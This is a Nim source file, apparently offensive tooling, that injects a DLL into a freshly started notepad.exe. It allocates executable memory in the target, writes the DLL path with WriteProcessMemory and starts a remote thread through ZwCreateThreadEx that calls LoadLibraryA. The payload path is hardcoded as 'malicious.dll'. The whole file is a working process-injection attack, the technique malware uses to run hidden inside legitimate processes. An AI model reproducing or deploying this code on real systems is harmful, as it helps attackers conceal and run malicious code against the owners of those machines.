import winim/lean 
import osproc
import ./zwcreatethreadex_cpplike

proc myFunc(procHandle: HANDLE, covPFuncProcAddr: LPTHREAD_START_ROUTINE, pDllAddr: LPVOID) {.header: "ZwCreateThread.h", importcpp: "$1(@)".}

proc injectCreateRemoteThread(dllPath: string): void = 
  let dwSize = cast[SIZE_T](dllPath.len)
  let newProcess = startProcess("notepad.exe");
  #newProcess.suspend() # 解除注释后notepad弹窗就会消失
  defer: newProcess.close()
  # 在该进程结束后退出
  echo "[*] Injecting: ", dllPath
  echo "[*] Target Process: ", newProcess.processID
  
  Sleep(500)
  let procHandle = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](newProcess.processID)
  )
  defer: CloseHandle(procHandle)
  echo "[*] pHandle: ", procHandle

  let pDllAddr = VirtualAllocEx(
    procHandle,
    NULL,
    dwSize,
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
  )

  var bytesWritten: SIZE_T 
  let wSuccess = WriteProcessMemory(
    procHandle,
    pDllAddr,
    dllPath.cstring,
    dwSize,
    addr bytesWritten
  )
  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  let pFuncProcAddr = LoadLibraryA
  echo "[*] Find kernel32 addr: ", if NULL == pFuncProcAddr: false else: true
  echo ""
  
  echo "[*] Try ZwCreateThreadEx ... "
  myFunc(procHandle, cast[LPTHREAD_START_ROUTINE](pFuncProcAddr), pDllAddr)
  echo "[+] Injected"

when isMainModule:
  var file = "C:/users/user/desktop/malicious.dll"
  injectCreateRemoteThread(file)

# nim cpp -r proc_inj_session0.nim